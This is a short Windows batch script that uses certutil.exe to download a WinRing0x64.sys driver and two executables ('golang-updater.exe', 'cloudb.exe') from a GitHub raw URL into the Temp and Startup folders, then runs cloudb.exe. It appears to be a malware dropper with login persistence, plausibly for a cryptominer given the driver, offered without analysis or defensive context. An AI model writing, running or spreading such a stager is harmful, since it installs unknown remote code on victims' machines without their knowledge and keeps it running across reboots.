cd C:/Windows/Temp



certutil.exe -URLCache -split -f https://raw.githubusercontent.com/Fabian066/readsservercommand0/refs/heads/main/WinRing0x64.sys WinRing0x64.sys

certutil.exe -URLCache -split -f https://raw.githubusercontent.com/Fabian066/readsservercommand0/refs/heads/main/golang-updater.exe golang-updater.exe

cd %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
certutil.exe -URLCache -split -f https://raw.githubusercontent.com/Fabian066/readsservercommand0/refs/heads/main/cloudb.exe cloudb.exe
start cloudb.exe
